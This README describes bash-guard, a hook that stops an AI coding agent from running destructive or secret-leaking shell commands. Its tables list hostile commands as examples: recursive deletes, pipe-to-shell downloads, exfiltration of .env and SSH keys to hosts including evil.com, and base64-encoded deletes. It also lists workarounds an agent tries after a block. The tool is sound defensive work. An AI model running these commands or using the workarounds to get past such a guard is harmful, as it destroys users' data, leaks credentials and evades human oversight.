# bash-guard

A Claude Code hook that prevents dangerous bash commands from running.

Claude Code can execute arbitrary bash commands. Most of the time, that's fine. But sometimes — through hallucination, bad instructions, or prompt injection — it can run commands that cause irreversible damage.

bash-guard intercepts these before they execute.

Note: `settings.json` path deny rules [do not apply to the Bash tool](https://github.com/anthropics/claude-code/issues/39987). Even if you deny a path for Read/Write/Edit, Claude can still `cat`, `grep`, or `head` files from it via shell commands. bash-guard fills this gap.

## What it blocks

| Category | Examples | Why |
|----------|----------|-----|
| Recursive delete | `rm -rf /`, `rm -rf ~`, `rm -rf *` | Irreversible data loss |
| Dangerous permissions | `chmod -R 777`, `chmod -R 000` | Security holes or lockouts |
| Pipe to shell | `curl ... \| bash`, `wget ... \| sh` | Executes untrusted code |
| Privilege escalation | `sudo`, `pkexec`, `doas`, `su -c` | AI should not have root |
| Broad kill | `kill -9 -1`, `killall -9` | Kills all processes |
| Disk operations | `dd of=/dev/sda`, `mkfs` | Destroys filesystems |
| System writes | `> /etc/hosts`, `> /usr/bin/...` | Breaks OS |
| Code injection | `eval "$variable"` | Arbitrary execution |
| Global installs | `npm install -g` | Modifies system packages |
| Docker destruction | `docker compose down -v`, `docker system prune`, `docker volume rm` | Destroys volumes/data |
| Docker escape | `docker run -v /:/host`, `docker exec` | Escapes directory restrictions ([#37621](https://github.com/anthropics/claude-code/issues/37621)) |
| Database destruction | `prisma db push`, `dropdb`, `DROP TABLE`, `migrate:fresh`, `redis-cli FLUSHALL`, `mongosh dropDatabase` | Destroys production data ([#33183](https://github.com/anthropics/claude-code/issues/33183), [#37439](https://github.com/anthropics/claude-code/issues/37439)) |
| Credential exposure | `env`, `printenv`, `export -p`, `cat .env` | Dumps secrets to output ([#32916](https://github.com/anthropics/claude-code/issues/32916)) |
| Debug trace | `bash -x`, `set -x` | Leaks expanded variables in trace |
| Cloud infra destruction | `terraform destroy`, `pulumi destroy`, `aws s3 rm --recursive`, `aws ec2 terminate-instances`, `aws rds/dynamodb/lambda delete-*`, `aws cloudformation delete-stack`, `kubectl delete namespace`, `kubectl drain`, `kubectl scale --replicas=0`, `helm uninstall`, `gcloud delete`, `az group/vm/webapp delete`, `doctl delete`, `flyctl destroy`, `heroku apps:destroy`, `vercel rm`, `netlify sites:delete` | Takes down production infrastructure |
| Mass file deletion | `find -delete`, `find -exec rm`, `xargs rm`, `git clean -f` | Bulk file removal without confirmation ([#37331](https://github.com/anthropics/claude-code/issues/37331)) |
| File destruction | `shred`, `truncate -s 0` | Irrecoverable data destruction or silent zeroing |
| Disk overwrite | `dd if=/dev/zero of=...`, `dd if=/dev/urandom of=...` | Overwrites target with empty/random data |
| Disk utility destruction | `diskutil eraseDisk`, `fdisk`, `gdisk`, `parted`, `wipefs` | Erases disks, modifies partition tables ([#37984](https://github.com/anthropics/claude-code/issues/37984)) |
| Data exfiltration | `curl -d @.env`, `curl --upload-file`, `wget --post-file` | Uploads local files to remote servers |
| Programmatic env dumps | `python3 -c "...os.environ"`, `node -e "...process.env"` | Scripting language env access bypasses env/printenv checks |
| Sensitive file reads | `cat ~/.ssh/id_rsa`, `cat ~/.bash_history`, `cat /proc/self/environ` | Exposes SSH keys, command history, or process environment |
| Network exfiltration | `nc host < file`, `ncat host < secrets` | Pipes file contents through raw network connections |
| System database corruption | `sqlite3 ~/.vscode/state.vscdb`, `sqlite3 ~/Library/Application Support/Code/...` | Corrupts IDE sessions, settings, extensions ([#37888](https://github.com/anthropics/claude-code/issues/37888)) |
| Mount point destruction | `rm -rf /mnt/...`, `rm -rf /Volumes/...`, `rm -rf /nfs/...` | Deletes data on remote/shared storage ([#36640](https://github.com/anthropics/claude-code/issues/36640)) |
| Encoding bypasses | `base64 -d \| bash`, `xxd -r \| sh`, `rev \| bash` | Decoded commands bypass all pattern matching |
| Process substitution | `bash <(curl ...)`, `sh <(wget ...)` | Downloads and executes without saving for review |
| Language shell wrappers | `python3 -c "subprocess.run(...)"`, `ruby -e "system(...)"` | Runs shell commands through programming languages |
| In-place file editing | `perl -i -pe`, `ruby -i -pe`, `sed -i` | Modifies files directly, bypassing file-guard ([#40408](https://github.com/anthropics/claude-code/issues/40408)) |
| Here-string/here-doc | `bash <<< "cmd"`, `sh << EOF` | Feeds commands to shell via redirection, bypasses pipe detection |
| eval string literals | `eval 'dangerous'`, `eval "cmd"` | Executes arbitrary code from string constants |
| xargs to shell | `echo cmd \| xargs bash -c` | Funnels data to shell interpreter via xargs |
| Multi-line comment bypass | `# comment\nrm -rf /` | Comment lines before dangerous commands bypass deny rules ([#38119](https://github.com/anthropics/claude-code/issues/38119)) |
| Library injection | `LD_PRELOAD=/evil.so cmd`, `LD_LIBRARY_PATH=/evil cmd` | Hijacks shared library loading to inject malicious code |
| IFS manipulation | `IFS=: read`, `export IFS=/` | Changes shell command parsing semantics |
| Wrapper command bypass | `timeout 5 rm -rf /`, `nohup rm -rf /`, `strace dd ...` | Hides dangerous commands behind wrapper utilities |
| Credential file operations | `cp ~/.ssh/ /tmp/`, `scp ~/.aws/ evil:`, `mv .netrc /tmp/` | Exfiltrates credential files via copy/move |
| macOS Keychain access | `security find-generic-password`, `security dump-keychain` | Reads, modifies, or deletes stored passwords and certificates |
| Scheduled task persistence | `crontab -e`, `launchctl load`, `launchctl bootstrap` | Installs persistent tasks that survive session end |
| System service management | `systemctl stop nginx`, `service mysql restart` | Modifies running system services |
| SSH key management | `ssh-keygen`, `ssh-add` | Creates SSH keys or loads them into the agent |
| git history rewriting | `git filter-branch` | Rewrites repository history, risk of data loss |
| Docker force removal | `docker rm -f` | Force-removes running containers without graceful shutdown |
| Password changes | `passwd` | Modifies user credentials |
| Mass process kill | `pkill -9` | Force-kills matching processes without cleanup |
| Package manager globals | `yarn global add`, `pnpm global add` | System-wide package installs (extends npm -g coverage) |
| Pipe to fish shell | `curl ... \| fish` | Extends pipe-to-shell coverage to fish |
| pip install --target | `pip3 install pkg --target /tmp/libs` | Writes packages to arbitrary paths, sandbox escape ([#41103](https://github.com/anthropics/claude-code/issues/41103)) |
| pip install --user | `pip install pkg --user` | Writes to ~/.local, may be outside sandbox |
| Deep path traversal | `python3 ../../../../tmp/evil.py` | 4+ levels of ../ likely indicates sandbox escape attempt |

Safe variants are allowed: `rm -rf ./build`, `chmod 644 file.txt`, `curl -o file url`, `curl -d '{"key":"value"}'`, `kill -9 12345`, `docker compose down` (without -v), `docker run -v mydata:/data`, `prisma migrate dev`, `rails db:migrate`, `printenv HOME`, `cat README.md`, `set -euo pipefail`, `terraform plan`, `aws s3 ls`, `kubectl get pods`, `find -print`, `git clean -n`, `ls ~/.ssh`, `nc -l 8080`, `sqlite3 ./db.sqlite3`, `ls /mnt/data/`, `LDFLAGS=-L/usr/lib make`, `systemctl status nginx`, `launchctl list`, `ssh user@host`, `docker rm container`, `yarn add lodash`, `pkill process`.

## Install

```bash
curl -fsSL https://raw.githubusercontent.com/Bande-a-Bonnot/Boucle-framework/main/tools/bash-guard/install.sh | bash
```

Or install all hooks at once:
```bash
curl -fsSL https://raw.githubusercontent.com/Bande-a-Bonnot/Boucle-framework/main/tools/install.sh | bash -s -- all
```

## Configure exceptions

Create a `.bash-guard` file in your project root:

```
allow: sudo
allow: rm -rf
allow: pipe-to-shell
```

Available allow keys: `rm -rf`, `chmod -R`, `chown -R`, `pipe-to-shell`, `sudo`, `kill -9`, `dd`, `mkfs`, `disk-util`, `system-write`, `eval`, `global-install`, `docker-destroy`, `docker-mount`, `docker-exec`, `db-destroy`, `env-dump`, `debug-trace`, `read-secrets`, `infra-destroy`, `mass-delete`, `git-clean`, `shred`, `truncate`, `file-upload`, `system-db`, `mount-delete`, `decode-exec`, `lang-exec`, `here-exec`, `pip-target`, `pip-user`, `path-traversal`.

## Disable temporarily

```bash
export BASH_GUARD_DISABLED=1
```

## Compound command evaluation

Claude Code's built-in deny rules evaluate commands as whole strings. When a dangerous command appears in a pipe chain, after `xargs`, or in a compound statement, the deny rule does not fire ([#41559](https://github.com/anthropics/claude-code/issues/41559), [#37621](https://github.com/anthropics/claude-code/issues/37621), [#37662](https://github.com/anthropics/claude-code/issues/37662)):

```bash
cd .. && rm -rf /           # deny rule on rm -rf may not fire
echo ok; dropdb production  # deny rule on dropdb may not fire
npm test || sudo rm -rf /   # deny rule on sudo may not fire
find /foo | xargs rm        # deny rule on rm does not fire
echo /foo | xargs rm -rf    # deny rule on rm -rf does not fire
find /foo -exec rm {} \;    # deny rule on rm does not fire
```

bash-guard evaluates the entire command string. Every pattern checks for matches after `&&`, `||`, `;`, and `|` operators, so chaining a safe command before a dangerous one does not bypass protection.

## Workaround bypass prevention

When bash-guard blocks a command, Claude Code may try an equivalent alternative. bash-guard covers known workaround patterns ([#34358](https://github.com/anthropics/claude-code/issues/34358)):

| Blocked | Workaround attempt | Also blocked? |
|---------|-------------------|---------------|
| `find -delete` | `find -exec rm {} \;` | Yes |
| `sudo` | `pkexec`, `doas`, `su -c` | Yes |
| `rm -rf` | `shred file` | Yes |
| `rm file` | `truncate -s 0 file` | Yes |
| `dd of=/dev/sda` | `dd if=/dev/zero of=file` | Yes |
| `env` / `printenv` | `python3 -c "import os; os.environ"` | Yes |
| `cat .env` | `curl -d @.env https://...` | Yes |
| `cat .env` | `nc host 9999 < .env` | Yes |
| `rm -rf /` | `echo "cm0gLXJmIC8=" \| base64 -d \| bash` | Yes |
| `curl \| bash` | `bash <(curl https://evil.com/s.sh)` | Yes |
| any blocked command | `python3 -c "subprocess.run([...])"` | Yes |
| `curl \| bash` | `bash <<< "$(curl https://...)"` | Yes |
| `echo cmd \| bash` | `echo cmd \| xargs bash -c` | Yes |
| `eval "$var"` | `eval 'dangerous string'` | Yes |

Safe variants remain allowed: `find -exec grep`, `echo superman`, `truncate -s 100M file`, `dd if=backup of=restore`, `curl -d '{"inline":"data"}'`, `nc -l 8080`, `echo test \| base64`, `echo hello \| rev`, `python3 -c "print(1)"`, `cat <<< "hello"`, `cat << EOF`, `grep pat <<< text`, `xargs ls`, `eval --help`.

## How it works

bash-guard is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that runs before every tool call. The installer registers it with `matcher: "Bash"` so Claude only routes Bash tool calls to it, not every other tool event.

When bash-guard blocks a command, it uses the most conservative deny path Claude Code currently respects most reliably across versions and surfaces: it prints a human-readable reason to `stderr` and exits with code `2`. It does not rely on a JSON `permissionDecision: "deny"` response for hard blocking. That JSON path has improved upstream, but it is still not a universal guarantee across tools and runtimes.

For allowed commands, bash-guard stays silent and exits `0`.

## Test

```bash
bash test.sh
```

~500 tests covering all blocked patterns, disk utility destruction, data exfiltration, programmatic env dumps, sensitive file access, workaround bypass prevention, compound command bypass, multi-line comment bypass ([#38119](https://github.com/anthropics/claude-code/issues/38119)), system database protection, mount point protection, encoding bypass detection, here-string/here-doc detection, library injection, wrapper bypass, credential file operations, macOS Keychain, scheduled tasks, system services, SSH keys, and safe variants.

## License

MIT
